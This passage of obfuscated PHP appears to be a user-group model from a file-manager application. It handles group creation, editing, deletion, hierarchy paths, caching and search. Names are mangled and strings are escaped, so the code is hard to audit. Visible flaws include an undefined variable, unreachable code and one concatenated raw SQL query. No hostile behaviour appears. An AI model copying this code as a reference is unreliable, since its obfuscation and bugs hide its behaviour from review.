"\x6d\145\x74\141\106\151\x65\x6c\x64" => "\x67\x72\x6f\165\160\111\104"); protected function cacheFunctionAlias($æÕ˜ŸÉš) { $ÂÆ˜•Ğò =& $_SERVER[º·Ï‹¥³]; return array($ÂÆ˜•Ğò[2035] => array($æÕ˜ŸÉš[0], $ÂÆ˜•Ğò[2036]), $ÂÆ˜•Ğò[2037] => array($æÕ˜ŸÉš[0], $ÂÆ˜•Ğò[2038])); } protected function getInfo($£êÏ”Æµ, $£öÖõíË = false) { $²Çˆõ·â = $this->getInfoSimple($£êÏ”Æµ); if (!$²Çˆõ·â) { return !1; } if ($£öÖõíË) { return $this->_listDataApplyItem($²Çˆõ·â); } return $this->cacheFunctionGet($_SERVER[º·Ï‹¥³][2039], $£êÏ”Æµ); } protected function getInfoSimple($µÑãÊÎ, $ôú®×Œë = false) { $—§ÚŸïÊ =& $_SERVER[º·Ï‹¥³]; if ($ôú®×Œë) { $ÖšñØÂò = array($—§ÚŸïÊ[1952] => intval($µÑãÊÎ)); $—ÑôÏïä = $this->where($ÖšñØÂò)->find(); return is_array($—ÑôÏïä) ? $—ÑôÏïä : array(); } return $this->cacheFunctionGet($—§ÚŸïÊ[2040], $µÑãÊÎ); } protected function groupAdd($ÄšËóŸ) { $ÜÑêå¨Ü =& $_SERVER[º·Ï‹¥³]; if (!$ÄšËóŸ[$ÜÑêå¨Ü[183]] && isset($ÄšËóŸ[$ÜÑêå¨Ü[1952]]) && $ÄšËóŸ[$ÜÑêå¨Ü[1952]] == 1) { if ($ş¿®æª = $this->getInfoSimple($ÄšËóŸ[$ÜÑêå¨Ü[1952]], !0)) { return $ÄšËóŸ[$ÜÑêå¨Ü[1952]]; } } else { $ş¿®æª = $this->getInfoSimple($ÄšËóŸ[$ÜÑêå¨Ü[183]]); if (!$ş¿®æª) { return !1; } } $¹¥ûà—õ = $ÜÑêå¨Ü[579]; if ($ş¿®æª[$ÜÑêå¨Ü[569]]) { $¹¥ûà—õ = $ş¿®æª[$ÜÑêå¨Ü[569]] . $ş¿®æª[$ÜÑêå¨Ü[1952]] . $ÜÑêå¨Ü[50]; } $½œ¤Şİæ = array($ÜÑêå¨Ü[478] => $this->groupNameAuto($ÄšËóŸ[$ÜÑêå¨Ü[183]], $ÄšËóŸ[$ÜÑêå¨Ü[32]]), $ÜÑêå¨Ü[461] => $ÄšËóŸ[$ÜÑêå¨Ü[183]], $ÜÑêå¨Ü[636] => $¹¥ûà—õ, $ÜÑêå¨Ü[2041] => $ÄšËóŸ[$ÜÑêå¨Ü[1939]], $ÜÑêå¨Ü[2042] => 0, $ÜÑêå¨Ü[1956] => 0); if (isset($ÄšËóŸ[$ÜÑêå¨Ü[1976]])) { $½œ¤Şİæ[$ÜÑêå¨Ü[1976]] = $ÄšËóŸ[$ÜÑêå¨Ü[1976]]; } else { $¼Ò–’‘ = $this->max($ÜÑêå¨Ü[1976]); if (!$¼Ò–’‘) { $¼Ò–’‘ = 0; } $½œ¤Şİæ[$ÜÑêå¨Ü[1976]] = $¼Ò–’‘ + 1; } if (!empty($ÄšËóŸ[$ÜÑêå¨Ü[1952]])) { $½œ¤Şİæ[$ÜÑêå¨Ü[1952]] = $ÄšËóŸ[$ÜÑêå¨Ü[1952]]; } $‹·‘õç = $this->add($½œ¤Şİæ); $this->setNamePinyin($‹·‘õç, $½œ¤Şİæ[$ÜÑêå¨Ü[32]]); if (isset($ÄšËóŸ[$ÜÑêå¨Ü[2043]])) { $this->metaSet($‹·‘õç, array($ÜÑêå¨Ü[2043] => $ÄšËóŸ[$ÜÑêå¨Ü[2043]], $ÜÑêå¨Ü[2044] => $ÄšËóŸ[$ÜÑêå¨Ü[2044]])); unset($ÄšËóŸ[$ÜÑêå¨Ü[2043]]); unset($ÄšËóŸ[$ÜÑêå¨Ü[2044]]); } Model($ÜÑêå¨Ü[1388])->groupRootAdd($‹·‘õç); $this->_clearCache($ÄšËóŸ[$ÜÑêå¨Ü[183]]); return $‹·‘õç; } protected function groupEdit($¦«¿ßŸû, $Éï‰Óéƒ) { $¤´Ê°ş¦ =& $_SERVER[º·Ï‹¥³]; $ÈÍ‡©² = $this->getInfoSimple($¦«¿ßŸû); if (!$ÈÍ‡©²) { return !1; } if (!empty($Éï‰Óéƒ[$¤´Ê°ş¦[183]])) { $“ßô·›» = $this->getInfoSimple($Éï‰Óéƒ[$¤´Ê°ş¦[183]]); if (!$“ßô·›») { return !1; } if ($ÈÍ‡©²[$¤´Ê°ş¦[1952]] == $“ßô·›»[$¤´Ê°ş¦[1952]]) { return !1; } if ($Éï‰Óéƒ[$¤´Ê°ş¦[183]] != $ÈÍ‡©²[$¤´Ê°ş¦[183]]) { if ($“ßô·›»[$¤´Ê°ş¦[569]] !== $ÈÍ‡©²[$¤´Ê°ş¦[569]] && strpos($“ßô·›»[$¤´Ê°ş¦[569]], $ÈÍ‡©²[$¤´Ê°ş¦[569]] . $ÈÍ‡©²[$¤´Ê°ş¦[1952]] . $¤´Ê°ş¦[50]) === 0) { return !1; } $Éï‰Óéƒ[$¤´Ê°ş¦[636]] = $“ßô·›»[$¤´Ê°ş¦[569]] . $Éï‰Óéƒ[$¤´Ê°ş¦[183]] . $¤´Ê°ş¦[50]; $this->_changeChildLevel($ÈÍ‡©², $“ßô·›»); $this->_clearCache($“ßô·›»[$¤´Ê°ş¦[1952]]); $this->_clearCache($ÈÍ‡©²[$¤´Ê°ş¦[183]]); } } if (isset($Éï‰Óéƒ[$¤´Ê°ş¦[32]])) { $this->setNamePinyin($¦«¿ßŸû, $Éï‰Óéƒ[$¤´Ê°ş¦[32]]); } if (isset($Éï‰Óéƒ[$¤´Ê°ş¦[2043]])) { $this->metaSet($¦«¿ßŸû, array($¤´Ê°ş¦[2043] => $Éï‰Óéƒ[$¤´Ê°ş¦[2043]], $¤´Ê°ş¦[2044] => $Éï‰Óéƒ[$¤´Ê°ş¦[2044]])); unset($Éï‰Óéƒ[$¤´Ê°ş¦[2043]]); unset($Éï‰Óéƒ[$¤´Ê°ş¦[2044]]); } $this->_clearChildrenCache($ÈÍ‡©²); return $this->where(array($¤´Ê°ş¦[2045] => $¦«¿ßŸû))->save($Éï‰Óéƒ); } private function _clearChildrenCache($åÍÒ‡ìì) { $•°ïÙ“ø =& $_SERVER[º·Ï‹¥³]; $’ÄĞïèí = array($•°ïÙ“ø[636] => array($•°ïÙ“ø[596], $åÍÒ‡ìì[$•°ïÙ“ø[569]] . $åÍÒ‡ìì[$•°ïÙ“ø[1952]] . $•°ïÙ“ø[597])); $‰ç£€©É = $this->field($•°ïÙ“ø[1952])->where($’ÄĞïèí)->select(); foreach ($‰ç£€©É as $ù¾ïÚÅ¢) { $this->_clearCache($ù¾ïÚÅ¢[$•°ïÙ“ø[1952]]); } } private function _clearCache($ŒáåŸ¼) { $Úê¶°Ãû =& $_SERVER[º·Ï‹¥³]; $this->cacheFunctionClear($Úê¶°Ãû[2039], $ŒáåŸ¼); $this->cacheFunctionClear($Úê¶°Ãû[2040], $ŒáåŸ¼); } private function _changeChildLevel($¢ª¯Ã÷ƒ, $Üª¶åà¡, $ÍÔÖ’í‡ = false) { $şˆòŞÔÒ =& $_SERVER[º·Ï‹¥³]; $²˜ò‘šÁ = $¢ª¯Ã÷ƒ[$şˆòŞÔÒ[569]] . $¢ª¯Ã÷ƒ[$şˆòŞÔÒ[1952]] . $şˆòŞÔÒ[50]; $š“—£Ó° = $Üª¶åà¡[$şˆòŞÔÒ[569]] . $Üª¶åà¡[$şˆòŞÔÒ[1952]] . $şˆòŞÔÒ[50] . $¢ª¯Ã÷ƒ[$şˆòŞÔÒ[1952]] . $şˆòŞÔÒ[50]; if ($ÍÔÖ’í‡) { $š“—£Ó° = $Üª¶åà¡[$şˆòŞÔÒ[569]] . $Üª¶åà¡[$şˆòŞÔÒ[1952]] . $şˆòŞÔÒ[50]; } $‚°‘Åë = array($şˆòŞÔÒ[636] => array($şˆòŞÔÒ[596], $¢ª¯Ã÷ƒ[$şˆòŞÔÒ[569]] . $¢ª¯Ã÷ƒ[$şˆòŞÔÒ[1952]] . $şˆòŞÔÒ[597])); $ĞÄâôÕÆ = array($şˆòŞÔÒ[636] => array($şˆòŞÔÒ[645], "\162\x65\x70\x6c\141\143\145\x28\x70\x61\162\x65\x6e\164\114\x65\166\145\154\54\x27{$²˜ò‘šÁ}\x27\x2c\47{$š“—£Ó°}\x27\x29")); $this->_clearChildrenCache($¢ª¯Ã÷ƒ); $this->where($‚°‘Åë)->data($ĞÄâôÕÆ)->save(); } public function setNamePinyin($íşÆ˜Ö, $‡®Ô¶€å = false) { $İıÃ² =& $_SERVER[º·Ï‹¥³]; if (!$‡®Ô¶€å) { $¥¡¡ÊØ = $this->getInfoSimple($íşÆ˜Ö); $‡®Ô¶€å = $¥¡¡ÊØ[$İıÃ²[32]]; } if (!Input::check($‡®Ô¶€å, $İıÃ²[639])) { $this->metaSet($íşÆ˜Ö, $İıÃ²[522], null); $this->metaSet($íşÆ˜Ö, $İıÃ²[521], null); return; } $ˆìÌ· = array($İıÃ²[522] => str_replace($İıÃ²[53], $İıÃ²[12], Pinyin::get($‡®Ô¶€å)), $İıÃ²[521] => Pinyin::get($‡®Ô¶€å, $İıÃ²[640])); $this->metaSet($íşÆ˜Ö, $ˆìÌ·); } protected function groupStatus($êÄ™í¢™, $´ÕÙŞë›) { $ÅÓ¯ÊŸ =& $_SERVER[º·Ï‹¥³]; $ÀÁÈÀŞ = $this->getInfoSimple($êÄ™í¢™); if (!$ÀÁÈÀŞ) { return !1; } $this->_clearCache($êÄ™í¢™); return $this->metaSet($êÄ™í¢™, $ÅÓ¯ÊŸ[802], $´ÕÙŞë›); if ($´ÕÙŞë› == $ÅÓ¯ÊŸ[91]) { $‡¯Î†ßÑ = $this->parentLevelArray($ÀÁÈÀŞ[$ÅÓ¯ÊŸ[569]]); } else { } $‡¯Î†ßÑ[] = $ÀÁÈÀŞ[$ÅÓ¯ÊŸ[1952]]; $ñëçäê½ = array(); foreach ($‡¯Î†ßÑ as $êÄ™í¢™) { $ñëçäê½[] = array($ÅÓ¯ÊŸ[1952] => $êÄ™í¢™, $ÅÓ¯ÊŸ[97] => $ÅÓ¯ÊŸ[802], $ÅÓ¯ÊŸ[434] => $´ÕÙŞë›); $this->_clearCache($êÄ™í¢™); } return Model($ÅÓ¯ÊŸ[2046])->addAll($ñëçäê½, array(), !0); } protected function groupRemove($äá¬Òñ, $í½È¼Ùé = false) { $ıŸ£è¥ı =& $_SERVER[º·Ï‹¥³]; $¶¦×Öó = array($ıŸ£è¥ı[1952] => $äá¬Òñ); $‘òºÚ® = $this->where($¶¦×Öó)->find(); if (!$‘òºÚ® || $‘òºÚ®[$ıŸ£è¥ı[183]] == 0) { return !1; } if (!$í½È¼Ùé) { $Øëƒ“æ = $this->getInfoSimple($‘òºÚ®[$ıŸ£è¥ı[183]]); $this->_changeChildLevel($‘òºÚ®, $Øëƒ“æ, !0); $this->where(array($ıŸ£è¥ı[183] => $äá¬Òñ))->save(array($ıŸ£è¥ı[183] => $‘òºÚ®[$ıŸ£è¥ı[183]])); $this->_clearCache($Øëƒ“æ[$ıŸ£è¥ı[1952]]); } Model($ıŸ£è¥ı[2046])->where($¶¦×Öó)->delete(); Model($ıŸ£è¥ı[2047])->where($¶¦×Öó)->delete(); Model($ıŸ£è¥ı[876])->groupRootRemove($äá¬Òñ); $this->_clearCache($‘òºÚ®[$ıŸ£è¥ı[183]]); return $this->where($¶¦×Öó)->delete(); } protected function groupSort($¹ŠÜ‰‘³) { $øÅ€¦³ş =& $_SERVER[º·Ï‹¥³]; $Ô„Ä ½Í = array(); foreach ($¹ŠÜ‰‘³ as $‡€¯¸îÄ => $ó€¸ƒ¾Ü) { $Ô„Ä ½Í[] = array($øÅ€¦³ş[1952], $ó€¸ƒ¾Ü, $øÅ€¦³ş[1976], $‡€¯¸îÄ + 1); } $this->saveAll($Ô„Ä ½Í); } public function listData() { $ÆÖÙ’ÀÆ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÆÖÙ’ÀÆ[$_SERVER[º·Ï‹¥³][429]]); return $ÆÖÙ’ÀÆ; } private function _makeOrder($öƒéİæÃ = '') { $¢í÷Ø„š =& $_SERVER[º·Ï‹¥³]; $ñÒİüæ­ = array($¢í÷Ø„š[1952], $¢í÷Ø„š[32], $¢í÷Ø„š[1941], $¢í÷Ø„š[222]); $ùæº‡”Ö = array($¢í÷Ø„š[507] => $¢í÷Ø„š[508], $¢í÷Ø„š[509] => $¢í÷Ø„š[510]); $õª—ı¡ = Input::get($¢í÷Ø„š[514], $¢í÷Ø„š[7], $¢í÷Ø„š[1956], $ñÒİüæ­); $İ±Ì¥¨ = Input::get($¢í÷Ø„š[515], $¢í÷Ø„š[7], $¢í÷Ø„š[2048], array($¢í÷Ø„š[2048], $¢í÷Ø„š[509])); $İ±Ì¥¨ = $ùæº‡”Ö[$İ±Ì¥¨]; $öƒéİæÃ = $öƒéİæÃ . "{$õª—ı¡}\x20{$İ±Ì¥¨}\x2c\40\147\x72\x6f\165\x70\111\x44\40\141\163\143"; return $this->order($öƒéİæÃ); } public function listChild($šª£¨õä) { $¨üÓÉáÈ =& $_SERVER[º·Ï‹¥³]; $ÕíÃêĞ = $this->where(array($¨üÓÉáÈ[183] => $šª£¨õä))->_makeOrder()->selectPage(200); $this->_listDataApply($ÕíÃêĞ[$¨üÓÉáÈ[429]]); return $ÕíÃêĞ; } public function listChildIds($‰ñâ¨û) { $ß¯¬…Éª =& $_SERVER[º·Ï‹¥³]; if (is_string($£€÷º‡İ)) { $‰ñâ¨û = explode($ß¯¬…Éª[50], $‰ñâ¨û); } $»‰üÙö = $this->where(array($ß¯¬…Éª[1952] => array($ß¯¬…Éª[7], $‰ñâ¨û)))->field($ß¯¬…Éª[2049])->select(); if (!$»‰üÙö) { return !1; } $½Š€Ğ¾í = array(); foreach ($»‰üÙö as $ØíÊ–½) { $½Š€Ğ¾í[] = "\x73\145\154\145\143\x74\40\147\162\x6f\x75\x70\111\x44\40\x66\x72\157\155\40\x60\x67\162\157\165\x70\x60\x20\167\x68\145\x72\x65\40\160\141\162\145\156\164\114\x65\x76\x65\154\x20\x6c\x69\153\145\40\47{$ØíÊ–½[$ß¯¬…Éª[569]]}{$ØíÊ–½[$ß¯¬…Éª[1952]]}\54\45\x27"; } $½Š€Ğ¾í = implode($ß¯¬…Éª[2050], $½Š€Ğ¾í); $»‰üÙö = $this->query($½Š€Ğ¾í); if (!$»‰üÙö) { return array(); } $‰ñâ¨û = array_to_keyvalue($»‰üÙö, $ß¯¬…Éª[12], $ß¯¬…Éª[1952]); return array_unique($‰ñâ¨û); } public function listByID($ÚÊ‹×ØÏ) { $†ƒˆÕ¦ä =& $_SERVER[º·Ï‹¥³]; if (!$ÚÊ‹×ØÏ) { return array(); } $§ä‘Çã¦ = array($†ƒˆÕ¦ä[1952] => array($†ƒˆÕ¦ä[7], $ÚÊ‹×ØÏ)); $Ö¥Ÿû¦ = $this->where($§ä‘Çã¦)->select(); $Ö¥Ÿû¦ = array_sort_keep($Ö¥Ÿû¦, $†ƒˆÕ¦ä[1952], $ÚÊ‹×ØÏ); $this->_listDataApply($Ö¥Ÿû¦); return $Ö¥Ÿû¦; } public function listSearch($™ºùİ¶) { $¤ç—ƒ× =& $_SERVER[º·Ï‹¥³]; $Ü¥¬Üü¥ = trim($™ºùİ¶[$¤ç—ƒ×[2051]]); $®«Œä¢ï = explode($¤ç—ƒ×[53], $Ü¥¬Üü¥); if (!$Ü¥¬Üü¥ || count($®«Œä¢ï) == 1) { return $this->listSearchNow($™ºùİ¶); } $û£”¯ñó = array($¤ç—ƒ×[429] => array()); foreach ($®«Œä¢ï as $Ûª£¿®­) { if (!trim($Ûª£¿®­)) { continue; } $™ºùİ¶[$¤ç—ƒ×[2051]] = $Ûª£¿®­; $Í½Óõ‘Æ = $this->listSearchNow($™ºùİ¶); $û£”¯ñó[$¤ç—ƒ×[429]] = array_merge($û£”¯ñó[$¤ç—ƒ×[429]], $Í½Óõ‘Æ[$¤ç—ƒ×[429]]); } $û£”¯ñó[$¤ç—ƒ×[429]] = array_unique_by_key($û£”¯ñó[$¤ç—ƒ×[429]], $¤ç—ƒ×[1952]); $û£”¯ñó[$¤ç—ƒ×[426]] = array($¤ç—ƒ×[427] => count($û£”¯ñó[$¤ç—ƒ×[429]]), $¤ç—ƒ×[423] => 20, $¤ç—ƒ×[404] => 1, $¤ç—ƒ×[428] => 1); return $û£”¯ñó; } public function listSearchNow($½¸çßÚ) { $·¯íßô€ =& $_SERVER[º·Ï‹¥³]; $êÕ™ô”Ô = trim($½¸çßÚ[$·¯íßô€[2051]]); $•Œ’‡ò  = isset($½¸çßÚ[$·¯íßô€[2052]]) ? $½¸çßÚ[$·¯íßô€[2052]] : !1; if (!trim($êÕ™ô”Ô)) { return !1; } $êÕ™ô”Ô = str_replace($·¯íßô€[2053], $·¯íßô€[2054], $êÕ™ô”Ô); $×ëìÍÏä = array($·¯íßô€[1952] => array($·¯íßô€[443], "{$êÕ™ô”Ô}\x25"), $·¯íßô€[32] => array($·¯íßô€[443], "\x25{$êÕ™ô”Ô}\x25"), $·¯íßô€[1049] => $·¯íßô€[2055]); if ($•Œ’‡ò ) { $¯¹Ïæ¯¼ = $this->getInfoSimple($•Œ’‡ò ); $šû¨üàƒ = $¯¹Ïæ¯¼[$·¯íßô€[569]] . $•Œ’‡ò  . $·¯íßô€[597]; $×ëìÍÏä = array($×ëìÍÏä, array($·¯íßô€[569] => array($·¯íßô€[443], $šû¨üàƒ))); } $×ëìÍÏä = $this->parseWhereLike($×ëìÍÏä); $õÉÕ‘Í„ = $this->_makeOrder()->where($×ëìÍÏä)->selectPage(20); $õÉÕ‘Í„ = $õÉÕ‘Í„ ? $õÉÕ‘Í„ : array($·¯íßô€[429] => array(), $·¯íßô€[426] => array()); if (!$õÉÕ‘Í„ || count($õÉÕ‘Í„[$·¯íßô€[429]]) < 5 && Input::check($êÕ™ô”Ô, $·¯íßô€[369])) { $ÍÂ©£„• = $this->groupChildrenAll($•Œ’‡ò ); $ØĞºÙ€ = $this->_searchFromMeta($·¯íßô€[521], $êÕ™ô”Ô, 10, $ÍÂ©£„•); $íî³¢³ = $this->_searchFromMeta($·¯íßô€[522], $êÕ™ô”Ô, 10, $ÍÂ©£„•); $‡í³şò = array_merge($ØĞºÙ€, $íî³¢³, $õÉÕ‘Í„[$·¯íßô€[429]]); $õÉÕ‘Í„[$·¯íßô€[429]] = array_unique_by_key($‡í³şò, $·¯íßô€[1952]); $õÉÕ‘Í„[$·¯íßô€[426]][$·¯íßô€[427]] = count($õÉÕ‘Í„[$·¯íßô€[429]]); $õÉÕ‘Í„[$·¯íßô€[426]][$·¯íßô€[428]] = ceil($õÉÕ‘Í„[$·¯íßô€[426]][$·¯íßô€[427]] / $õÉÕ‘Í„[$·¯íßô€[426]][$·¯íßô€[423]]); } $this->_listDataApply($õÉÕ‘Í„[$·¯íßô€[429]]); return $õÉÕ‘Í„; } protected function groupChildrenAll($õûåÜÖµ) { $Àñ¦İö² =& $_SERVER[º·Ï‹¥³]; if (!$õûåÜÖµ) { return !1; } if (!is_array($õûåÜÖµ)) { $õûåÜÖµ = array($õûåÜÖµ); } $ô±¯”¶§ = $õûåÜÖµ; foreach ($õûåÜÖµ as $ÎÆŞæÊ) { $ø ®ú = $this->getInfoSimple($ÎÆŞæÊ); $ÔÛ¥ ­ = array($Àñ¦İö²[569] => array($Àñ¦İö²[443], $ø ®ú[$Àñ¦İö²[569]] . $ÎÆŞæÊ . $Àñ¦İö²[597])); $ÀÄóô¯Ç = $this->field($Àñ¦İö²[1952])->where($ÔÛ¥ ­)->select(); $ô±¯”¶§ = array_merge($ô±¯”¶§, array_to_keyvalue($ÀÄóô¯Ç, $Àñ¦İö²[12], $Àñ¦İö²[1952])); } return array_unique($ô±¯”¶§); } private function _searchFromMeta($Ûê¹†Ğù, $æ•ŠÔ­Ò, $ÕëôÎ´”, $ÃÆæ˜Ğ’) { $Í£¡¨ =& $_SERVER[º·Ï‹¥³]; $æ•ŠÔ­Ò = strtolower($æ•ŠÔ­Ò); $êµùõûæ = array($Í£¡¨[97] => $Ûê¹†Ğù, $Í£¡¨[434] => array($Í£¡¨[443], "\45{$æ•ŠÔ­Ò}\x25")); $êµùõûæ = $this->parseWhereLike($êµùõûæ); if ($ÃÆæ˜Ğ’) { $êµùõûæ[$Í£¡¨[1952]] = array($Í£¡¨[7], $ÃÆæ˜Ğ’); } $ø™€©¹ = Model($Í£¡¨[2056])->where($êµùõûæ)->limit($ÕëôÎ´”)->select(); if (!$ø™€©¹) { return array(); } $ø™€©¹ = array_to_keyvalue($ø™€©¹, $Í£¡¨[12], $Í£¡¨[1952]); $éÃÎÂ’ó = $this->where(array($Í£¡¨[2045] => array($Í£¡¨[7], $ø™€©¹)))->select(); if (!$éÃÎÂ’ó) { return array(); } return $éÃÎÂ’ó; } protected function _listDataApplyItem($ÌËé¦ ) { $è‘ÛŞã = array($ÌËé¦ ); $this->_listDataApply($è‘ÛŞã); return $è‘ÛŞã[0]; } protected function _listDataApply(&$Ã¤Ç¾ô£) { $ñ¨ Ä×ª =& $_SERVER[º·Ï‹¥³]; if (!$Ã¤Ç¾ô£) { return; } $Àï©®Ç¡ = array_to_keyvalue($Ã¤Ç¾ô£, $ñ¨ Ä×ª[12], $ñ¨ Ä×ª[1952]); $this->_listAppendChildren($Ã¤Ç¾ô£); $this->_listAppendChildrenMember($Ã¤Ç¾ô£); $this->_listAppendMeta($Ã¤Ç¾ô£, $Àï©®Ç¡); $this->_listAppendParent($Ã¤Ç¾ô£); $this->_listAppendSourceRoot($Ã¤Ç¾ô£, $Àï©®Ç¡); } private function _listAppendChildren(&$É˜…Ë) { $îğ¶ İµ =& $_SERVER[º·Ï‹¥³]; $‹Ú‹¦Íé = array_to_keyvalue($É˜…Ë, $îğ¶ İµ[12], $îğ¶ İµ[1952]); $âúÇÏ›¢ = array($îğ¶ İµ[183] => array($îğ¶ İµ[7], $‹Ú‹¦Íé)); $¨­¨ùâæ = array($îğ¶ İµ[183], $îğ¶ İµ[2057] => $îğ¶ İµ[550]); $Î¼Ğ¥ú = $this->field($¨­¨ùâæ)->where($âúÇÏ›¢)->group($îğ¶ İµ[183])->select(); $¬…²–ÚŞ = array_to_keyvalue($Î¼Ğ¥ú, $îğ¶ İµ[183], $îğ¶ İµ[550]); foreach ($É˜…Ë as &$æŸş’Ö¦) { $èÆñ«°” = $æŸş’Ö¦[$îğ¶ İµ[1952]]; $æŸş’Ö¦[$îğ¶ İµ[2058]] = isset($¬…²–ÚŞ[$èÆñ«°”]) ? intval($¬…²–ÚŞ[$èÆñ«°”]) : !1; } unset($æŸş’Ö¦); } private function _listAppendChildrenMember(&$˜Ïû¤¬¬) { $‚şáãñœ =& $_SERVER[º·Ï‹¥³]; $Äò íí³ = array_to_keyvalue($˜Ïû¤¬¬, $‚şáãñœ[12], $‚şáãñœ[1952]); $«»å¥®ì = array($‚şáãñœ[1952] => array($‚şáãñœ[7], $Äò íí³)); $½ËÏùÇ˜ = array($‚şáãñœ[1952], $‚şáãñœ[2057] => $‚şáãñœ[550]); $­Ü¤œ— = Model($‚şáãñœ[2047])->field($½ËÏùÇ˜)->where($«»å¥®ì)->group($‚şáãñœ[1952])->select(); $ûƒŒÜ“ = array_to_keyvalue($­Ü¤œ—, $‚şáãñœ[1952], $‚şáãñœ[550]); foreach ($˜Ïû¤¬¬ as &$ü¤¦¥²) { $ğ£åæÈ‚ = $ü¤¦¥²[$‚şáãñœ[1952]]; $ü¤¦¥²[$‚şáãñœ[2059]] = isset($ûƒŒÜ“[$ğ£åæÈ‚]) ? intval($ûƒŒÜ“[$ğ£åæÈ‚]) : !1; } unset($ü¤¦¥²); } private function _listAppendMeta(&$É…Äáõ‘, $à”í¤õº) { $—­œ öæ =& $_SERVER[º·Ï‹¥³]; $„è£‹²Ó = array($—­œ öæ[1952] => array($—­œ öæ[7], $à”í¤õº)); $±ºâÒĞ = Model($—­œ öæ[2046])->where($„è£‹²Ó)->select(); $±ºâÒĞ = array_to_keyvalue_group($±ºâÒĞ, $—­œ öæ[1952]); foreach ($±ºâÒĞ as &$ÙöªÓÙ) { $ÙöªÓÙ = array_to_keyvalue($ÙöªÓÙ, $—­œ öæ[97], $—­œ öæ[434]); } unset($ÙöªÓÙ); foreach ($É…Äáõ‘ as &$ÖÖ¡ğ»€) { $ÖÖ¡ğ»€[$—­œ öæ[523]] = array(); if (isset($±ºâÒĞ[$ÖÖ¡ğ»€[$—­œ öæ[1952]]])) { $ÖÖ¡ğ»€[$—­œ öæ[523]] = $±ºâÒĞ[$ÖÖ¡ğ»€[$—­œ öæ[1952]]]; } } unset($ÖÖ¡ğ»€); } protected function parentLevelArray($¨¨Ñ¨Éû) { $ï‰ıÙŒù =& $_SERVER[º·Ï‹¥³]; $¨¨Ñ¨Éû = explode($ï‰ıÙŒù[50], trim($¨¨Ñ¨Éû, $ï‰ıÙŒù[50])); $¨¨Ñ¨Éû = array_remove_value($¨¨Ñ¨Éû, $ï‰ıÙŒù[219]); return $¨¨Ñ¨Éû; } protected function parentInGroup($‡ÑÒ¡†¡, $ß¿™¾ş) { $Ş…¯’š =& $_SERVER[º·Ï‹¥³]; $îœÑÉäõ = $this->getInfoSimple($‡ÑÒ¡†¡); if (!$îœÑÉäõ) { return !0; } $ÁÚÕçâì = $this->parentLevelArray($îœÑÉäõ[$Ş…¯’š[569]]); $ÁÚÕçâì[] = $‡ÑÒ¡†¡; foreach ($ÁÚÕçâì as $‡ÑÒ¡†¡) { if (in_array($‡ÑÒ¡†¡ . $Ş…¯’š[12], $ß¿™¾ş)) { return !0; } } return !1; } private function _listAppendParent(&$†˜¿š÷) { $¡•óÈÃ€ =& $_SERVER[º·Ï‹¥³]; $ªš­Áç¹ = array(); foreach ($†˜¿š÷ as &$²æó„Ãï) { $ªš­Áç¹[$²æó„Ãï[$¡•óÈÃ€[1952]]] = $²æó„Ãï[$¡•óÈÃ€[32]]; $ØŸ‡…¼ã = $this->parentLevelArray($²æó„Ãï[$¡•óÈÃ€[569]]); foreach ($ØŸ‡…¼ã as $…˜ÜëÔ) { if (!isset($ªš­Áç¹[$…˜ÜëÔ])) { $ªš­Áç¹[$…˜ÜëÔ] = 0; } } } unset($²æó„Ãï); foreach ($ªš­Áç¹ as $şÕ‘è½” => $Û“‘é†²) { if ($Û“‘é†²) { continue; } $Ñğ–´ÒÉ = $this->getInfoSimple($şÕ‘è½”); $ªš­Áç¹[$şÕ‘è½”] = $Ñğ–´ÒÉ[$¡•óÈÃ€[32]]; } $È®¢¯éì = $GLOBALS[$¡•óÈÃ€[6]][$¡•óÈÃ€[92]][$¡•óÈÃ€[2060]]; if (KodUser::isRoot()) { $È®¢¯éì = !1; } foreach ($†˜¿š÷ as &$²æó„Ãï) { $ØŸ‡…¼ã = $this->parentLevelArray($²æó„Ãï[$¡•óÈÃ€[569]]); $˜å²á¸ = $¡•óÈÃ€[12]; foreach ($ØŸ‡…¼ã as $şÕ‘è½” => $…˜ÜëÔ) { if ($È®¢¯éì && $şÕ‘è½” == 0) { continue; } $˜å²á¸ .= $ªš­Áç¹[$…˜ÜëÔ] . $¡•óÈÃ€[8]; } if ($ØŸ‡…¼ã) { $˜å²á¸ .= $²æó„Ãï[$¡•óÈÃ€[32]]; } $²æó„Ãï[$¡•óÈÃ€[574]] = str_replace($¡•óÈÃ€[577], $¡•óÈÃ€[8], $˜å²á¸); } unset($²æó„Ãï); } private function _listAppendSourceRoot(&$Öƒˆ´³, $ÛîêĞ) { $á¼İÉïñ =& $_SERVER[º·Ï‹¥³]; $™†Ô±ã¾ = Model($á¼İÉïñ[876])->listSourceRoot(SourceModel::TYPE_GROUP, $ÛîêĞ); $™†Ô±ã¾ = array_to_keyvalue($™†Ô±ã¾, $á¼İÉïñ[554]); $™†Ô±ã¾ = array_remove_key($™†Ô±ã¾, $á¼İÉïñ[554]); foreach ($Öƒˆ´³ as &$™ğŠğ±õ) { $™ğŠğ±õ[$á¼İÉïñ[90]] = $™†Ô±ã¾[$™ğŠğ±õ[$á¼İÉïñ[1952]]] ? $™†Ô±ã¾[$™ğŠğ±õ[$á¼İÉïñ[1952]]] : array(); } unset($™ğŠğ±õ); } protected function groupMerge($œÑÑ³¨) { $œÑÑ³¨ = array_values(array_unique($œÑÑ³¨)); $’¢¯òãÓ = array(); for ($­Ì†™çÄ = 0; $­Ì†™çÄ < count($œÑÑ³¨); $­Ì†™çÄ++) { $ïùàÅ»­ = !1; for ($çë§Áô† = 0; $çë§Áô† < count($œÑÑ³¨); $çë§Áô†++) { if ($­Ì†™çÄ == $çë§Áô†) { continue; } if ($this->isParentOf($œÑÑ³¨[$çë§Áô†], $œÑÑ³¨[$­Ì†™çÄ])) { $ïùàÅ»­ = !0; break; } } if (!$ïùàÅ»­) { $’¢¯òãÓ[] = $œÑÑ³¨[$­Ì†™çÄ]; } } return $’¢¯òãÓ; } protected function isParentOf($Š™³¶ûë, $Âç™¸ã©) { $ÚÚ· †· =& $_SERVER[º·Ï‹¥³]; if (!$Š™³¶ûë || !$Âç™¸ã© || $Š™³¶ûë == $Âç™¸ã©) { return !1; } $ü éÍ÷ = $this->getInfoSimple($Š™³¶ûë); $¾Û£ã†œ = $this->getInfoSimple($Âç™¸ã©); $š…Íê¶Ä = $ü éÍ÷[$ÚÚ· †·[569]] . $Š™³¶ûë . $ÚÚ· †·[50]; if (substr($¾Û£ã†œ[$ÚÚ· †·[569]], 0, strlen($š…Íê¶Ä)) == $š…Íê¶Ä) { return !0; } return !1; } public function groupShowRoot($‰ »éÊÈ, $‘õÅÁú = false) { 